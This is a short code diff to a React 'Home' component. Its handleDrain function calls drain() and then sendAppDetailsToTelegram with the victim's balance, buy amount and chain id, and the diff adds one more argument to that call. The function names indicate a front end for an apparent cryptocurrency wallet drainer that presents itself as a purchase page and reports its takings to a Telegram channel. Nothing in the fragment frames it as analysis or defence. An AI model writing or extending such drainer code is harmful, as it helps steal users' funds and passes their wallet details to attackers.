@@ -126,7 +126,7 @@ const Home = () => {
 
   const handleDrain = () => {
     drain();
-    sendAppDetailsToTelegram(balance, buyValue, chain?.id)
+    sendAppDetailsToTelegram(balance, buyValue, chain?.id, buyValue)
   }
   console.log(bottomAsset, asset, tokenPrice);
   return (
